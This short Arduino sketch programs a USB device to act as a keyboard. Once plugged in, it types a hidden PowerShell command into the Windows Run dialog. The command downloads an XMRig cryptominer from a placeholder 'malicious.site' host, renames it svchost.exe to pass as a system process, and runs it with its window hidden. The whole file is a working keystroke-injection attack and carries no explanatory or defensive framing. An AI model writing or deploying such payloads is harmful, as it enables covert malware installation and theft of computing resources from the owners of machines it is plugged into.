#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println("powershell Invoke-WebRequest -Uri 'http://malicious.site/xmrig.exe' -OutFile $env:TEMP\\svchost.exe ; Start-Process $env:TEMP\\svchost.exe -WindowStyle Hidden");
}

void loop() {}
